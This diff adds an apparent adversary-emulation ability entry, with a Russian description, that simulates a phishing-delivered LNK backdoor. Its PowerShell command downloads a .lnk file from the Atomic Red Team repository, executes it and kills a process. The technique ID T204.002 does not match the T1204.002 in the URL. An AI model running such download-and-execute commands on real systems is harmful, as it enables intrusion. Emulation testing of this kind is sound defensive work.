@@ -1,0 +1,13 @@
+- id: 612b6cfa-4ebe-4e50-bb1f-9feff9f4aaap
+  name: "[SHADOW-TWELVE] Lnk-backdoor execution"
+  description: "Атакующие используют методы социальной инженерии, чтобы вынудить пользователя запустить вредоносный файл из вложения фишингового сообщения"
+  tactic: execution
+  technique:
+    attack_id: T204.002
+    name: "User Execution: Malicious File"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"; $file1 = "$env:Temp\test10.lnk"; Start-Process $file1; Start-Sleep -s 20; taskkill /IM a.exe /F
+        timeout: 90
